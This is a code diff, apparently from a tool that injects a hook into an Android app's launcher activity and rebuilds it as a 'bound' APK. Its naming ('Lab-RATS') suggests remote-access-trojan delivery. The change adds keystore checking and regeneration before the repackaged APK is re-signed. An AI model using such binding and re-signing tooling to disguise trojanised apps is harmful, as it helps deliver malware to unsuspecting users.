@@ -468,6 +468,29 @@ def hook_launcher_activity(target_dir, launcher_class):
         f.write(content)
 
 
+def ensure_valid_keystore(keystore_path, storepass, keyalias):
+    """Ensure keystore exists and contains the specified keyalias."""
+    if os.path.exists(keystore_path):
+        cmd = ["keytool", "-list", "-keystore", keystore_path, "-alias", keyalias, "-storepass", storepass]
+        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if res.returncode != 0:
+            log_warn(f"Keystore alias '{keyalias}' not found in {keystore_path}. Regenerating keystore...")
+            try:
+                os.remove(keystore_path)
+            except Exception:
+                pass
+
+    if not os.path.exists(keystore_path):
+        log_info(f"Generating fresh keystore at {keystore_path}...")
+        cmd_gen = [
+            "keytool", "-genkeypair", "-alias", keyalias,
+            "-keyalg", "RSA", "-keysize", "2048", "-validity", "9125",
+            "-keystore", keystore_path, "-storepass", storepass, "-keypass", storepass,
+            "-dname", "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
+        ]
+        run_cmd(cmd_gen)
+
+
 def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore_path, storepass, keyalias):
     log_info("Rebuilding bound APK with apktool...")
     unsigned_apk = os.path.join(script_dir, "temp_binder", "unsigned_bound.apk")
@@ -503,6 +526,7 @@ def recompile_and_sign(apktool_cmd, script_dir, target_dir, output_apk, keystore
 
     # Sign APK
     log_info("Signing bound APK...")
+    ensure_valid_keystore(keystore_path, storepass, keyalias)
     if shutil.which("apksigner"):
         run_cmd(["apksigner", "sign", "--ks", keystore_path, "--ks-pass", f"pass:{storepass}", "--ks-key-alias", keyalias, "--out", output_apk, aligned_apk])
     elif shutil.which("jarsigner"):
